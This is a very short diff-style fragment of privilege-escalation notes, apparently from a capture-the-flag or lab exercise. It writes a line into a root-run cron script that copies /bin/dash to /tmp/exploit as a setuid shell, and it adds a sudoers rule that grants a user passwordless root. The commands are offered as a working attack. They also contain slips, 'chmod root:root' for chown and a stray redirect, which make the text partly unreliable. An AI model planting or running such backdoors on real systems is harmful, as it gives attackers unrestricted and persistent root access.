@@ -1,3 +1,9 @@
 to get root make this run by root once
 
 echo     "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit">                   >/usr/local/sbin/cron-logrotate.sh
+
+
+
+
+
+username  ALL=(ALL) NOPASSWD:ALL
